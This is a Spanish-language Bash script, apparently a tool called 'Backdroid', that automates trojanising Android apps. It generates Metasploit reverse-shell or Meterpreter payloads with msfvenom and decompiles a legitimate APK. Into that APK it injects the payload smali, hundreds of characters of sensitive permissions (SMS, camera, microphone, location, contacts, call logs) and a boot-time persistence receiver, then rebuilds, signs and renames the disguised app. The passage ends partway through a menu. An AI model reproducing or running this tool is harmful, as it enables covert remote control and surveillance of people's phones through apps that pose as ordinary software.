#!/bin/bash
#BIENVENIDO BACKDROIDE
resize -s 34 64 > /dev/null
BLUE="\e[1;96m"
BLUE2="\e[1;94m"
GREEN="\e[1;92m"
MORADO="\e[1;95m"
NARANJA="\e[1;93m"
RED="\e[1;91m"
WHITE="\e[1;97m"
#FUNCIONES
ruta='pwd'

#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";



function checkinternet() 
{
       tput civis
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow "COMPROBANDO CONEXION: ${RED}[X] ERROR"
    echo
    echo -e $yellow "SE RECOMIENDA ACCESO A INTERNET"
    echo
    sleep 1
  else
    echo -e $yellow "COMPROBANDO CONEXION: ${GREEN}[✔] CONECTADO"
  fi
}

function INYECCION!() {
  #Define options
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo
path=`pwd`
lanip=`hostname -I`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
ver="v0.3"
APKTOOL="$path/apktool.jar"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
spinlong ()
{
    bar=" ==========================================================="
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r<%-${barlength}s>\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}



function get_lhost() 
{
echo -e "${BLUE}"
echo -e "IP LOCAL: "$lanip 
echo -e "IP PUBLICA: "$publicip
echo
echo -e "${WHITE}"
read -p "[*] IP O HOST: " LHOST
echo
}
#function lport
function get_lport() 
{
read -p "[*] PUERTO: " LPORT
echo
}
#function payload
function get_payload()
{
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
echo -e "¿QUE PAYLOAD DESEA USAR?"
echo
echo -e "${BLUE}"
echo "android/meterpreter/reverse_tcp" 
echo "android/meterpreter/reverse_http" 
echo "android/meterpreter/reverse_https" 
echo "android/shell/reverse_tcp" 
echo "android/shell/reverse_http" 
echo "android/shell/reverse_https"  
echo "android/meterpreter_reverse_tcp" 
echo "android/meterpreter_reverse_http" 
echo "android/meterpreter_reverse_https" 
echo
echo -e $Reset""
read -p "[*] PAYLOAD: " PAYLOAD
echo
}


#function original apk
function orig_apk()
{
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
  echo -e $yellow"RUTA ACTUAL"$Reset
  pwd
  echo
  ls -x 
  echo
 read -p "[*] RUTA Y NOMBRE DEL APK ORIGINAL (ejp:file/original.apk):" orig
 echo
}
tput cnorm;
function gen_payload()
{
       tput civis
 echo -e $yellow ""
 echo "[*] GENERANDO PAYLOAD"
 spinlong
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o backdroid.apk > /dev/null 2>&1
}
function up_apktook()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Removiendo 1.apk framework file..."
 spinlong
 apktool empty-framework-dir --force > /dev/null 2>&1
}
function apk_decomp()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Descompilando Payload..."
 spinlong
 java -jar $APKTOOL d -f -o $path/payload $path/backdroid.apk > /dev/null 2>&1
 rm backdroid.apk
}
function apk_decomp1()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Descompilando APK Original..."
 spinlong
 java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
}
function apache_svc_start()
{
 service apache2 start
}
function apache_svc_stop()
{
 service apache2 stop 
}
#function postgresql service
function postgresql_start()
{
 service postgresql start 
}
function postgresql_stop()
{
 service postgresql stop 
}
# function adding permission
function perms()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Añadiendo permisos y Smali"
 spinlong
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 android_nam=$tmp
}
# functions hook smali
function hook_smalies()
{
       tput civis
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  echo 
  echo "=================================================================="
  echo "Payload inyectado en: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "linea:$hook_num"
  echo "=================================================================="
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  echo 
  echo "=================================================================="
  echo "Payload inyectado en: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "linea:$hook_num"
  echo "=================================================================="
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    spinlong
    echo -e $red ""
    echo "[x] No puedo encontrar : $android_activity.smali"
    echo "[*] Prueba otro apk..."
    spinlong
    sleep 2
    echo 
    echo "=================================================================="
    echo "Payload inyectado en: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    echo "linea:$hook_num"
    echo "=================================================================="
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi 
 fi
}
get_lhost
                get_lport
                echo
                clear 
                get_payload
                clear 
                orig_apk
                clear
                spinlong
                gen_payload
                up_apktook
                apk_decomp1
                apk_decomp
                perms
                hook_smalies
                spinlong
                rm -r $path/payload
                echo -e "${GREEN}LISTO "
                tput cnorm;
}
tput cnorm;
function INYECCION!2()
{
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
#Define options
path=`pwd`
lanip=`hostname -I`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
ver="v0.3"
APKTOOL="$path/apktool.jar"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
echo""
spinlong ()
{
    bar=" ============================================================"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r<%-${barlength}s>\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}


#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";

tput cnorm;
function get_lhost() 
{
echo -e "${BLUE}"
echo -e "IP LOCAL: "$lanip 
echo -e "IP PUBLICA: "$publicip
echo
echo -e "${WHITE}"
read -p "[*] IP O HOST: " LHOST
echo
}
#function lport
function get_lport() 
{
read -p "[*] PUERTO: " LPORT
echo
}
#function payload
function get_payload()
{
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
echo -e "¿QUE PAYLOAD DESEA USAR?"
echo
echo -e "${BLUE}"
echo "android/meterpreter/reverse_tcp" 
echo "android/meterpreter/reverse_http" 
echo "android/meterpreter/reverse_https" 
echo "android/shell/reverse_tcp" 
echo "android/shell/reverse_http" 
echo "android/shell/reverse_https"  
echo "android/meterpreter_reverse_tcp" 
echo "android/meterpreter_reverse_http" 
echo "android/meterpreter_reverse_https" 
echo
echo -e "${WHITE}"
read -p "[*] PAYLOAD: " PAYLOAD
echo
}

function ap2_name()
{
read -p "[*] NOMBRE: " ap_name
echo
}
#function original apk
function orig_apk()
{
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
  echo -e $yellow"RUTA ACTUAL"$Reset
  echo -e ${WHITE}
  pwd
  echo
  ls -x 
  echo
 read -p "[*] RUTA Y NOMBRE DEL APK ORIGINAL (ejp:file/original.apk):" orig
 echo
}

function gen_payload()
{
       tput civis
 echo -e $yellow ""
 echo "[*] GENERANDO PAYLOAD"
 spinlong
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o backdroid.apk > /dev/null 2>&1
}
function up_apktook()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Removiendo 1.apk framework file..."
 spinlong
 apktool empty-framework-dir --force > /dev/null 2>&1
}
function apk_decomp()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Descompilando Payload..."
 spinlong
 java -jar $APKTOOL d -f -o $path/payload $path/backdroid.apk > /dev/null 2>&1
 rm backdroid.apk
}
function apk_decomp1()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Descompilando APK Original..."
 spinlong
java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
}
function apache_svc_start()
{
 service apache2 start
}
function apache_svc_stop()
{
 service apache2 stop 
}
#function postgresql service
function postgresql_start()
{
 service postgresql start 
}
function postgresql_stop()
{
 service postgresql stop 
}
# function adding permission
function perms()
{
       tput civis
 echo -e $yellow ""
 echo "[*] Añadiendo permisos y Smali"
 spinlong
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 android_nam=$tmp
}
# functions hook smali
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  echo 
  echo "================================================================"
  echo "Payload inyectado: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "linea:$hook_num"
  echo "================================================================"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  echo 
  echo "================================================================"
  echo "Payload inyectado: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "linea:$hook_num"
  echo "================================================================"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    spinlong
    echo -e $red ""
    echo "[x] No puedo encontrar : $android_activity.smali"
    echo "[*] Prueba otro apk ..."
    spinlong
    sleep 2 
    echo 
    echo "================================================================"
    echo "Payload inyectado: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    echo "linea:$hook_num"
    echo "================================================================"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi 
 fi
}
get_lhost
get_lport
                echo
                ap2_name
                clear 
                get_payload
                clear 
                orig_apk
                clear
                spinlong
                gen_payload
                up_apktook
                apk_decomp1
                apk_decomp
                perms
                hook_smalies
                spinlong
                rm -r $path/payload
                
                echo -e "$yellow"
                echo "[*] COMPILANDO APP..."
                spinlong
                echo
                java -jar $path/apktool.jar b original -o virus.apk > /dev/null 2>&1
                rm -r $path/original
                if [ -f virus.apk ];then
                echo -e "$yellow"
                tput cnorm;
                echo -e "[*] FIRMANDO APP..."
                spinlong
                echo
                echo -e "Contraseña: 102020"
                jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1  -keystore  backdroid.keystore  virus.apk backdroid > /dev/null 2>&1
                tput civis
                echo -e "$yellow"
                echo -e "[*] COMPRIMIENDO APP..."
                spinlong
                echo
                zipalign -v 4 virus.apk $ap_name.apk > /dev/null 2>&1
                rm -r virus.apk 
                
                echo -e "$yellow"
                echo -e "[*] FINALIZANDO..."
                spinlong
                echo
                sleep 2
                
                echo -e "$yellow"
                echo -e "[✔] OPERACION COMPLETADA :)"
                spinlong
                echo
                tput cnorm;
                else
                echo -e "${RED}[!] ERROR DE COMPILACION :("
                menu3
                tput cnorm;
                fi

}
function menu3() {
echo -e "${GREEN}  

       ▄▄▄▄·  ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
       ▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
       ▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
       ██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
       ·▀▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀•  "
echo -e "                                               ${MORADO}by: Yaxter${WHITE}"
echo   
while :
do
option=0
echo
echo -e "${NARANJA}BACKDOOR AUTOMATICO ✔"
echo 
echo -e "${NARANJA}[1]${GREEN}AUTOMATICO"
echo
echo -e "${NARANJA}BACKDOOR MANUAL ✔"
echo
echo -e "${NARANJA}[2]${GREEN}DESCOMPILAR APP Y INYECTAR PAYLOAD"
echo
echo -e "${NARANJA}[3]${GREEN}COMPILAR"
echo
echo -e "${NARANJA}[4]${GREEN}FIRMAR APP"
echo
echo -e "${NARANJA}[5]${GREEN}COMPRIMIR APP"
echo
echo -e "${NARANJA}[6]${GREEN}GENERAR KEYSTORE"
echo
echo -e "${NARANJA}[7]${GREEN}<--VOLVER"
echo
echo -n -e "${BLUE}>>> "
read atrir
case $atrir in
2)
spiner
echo -e $Reset""
clear
INYECCION!
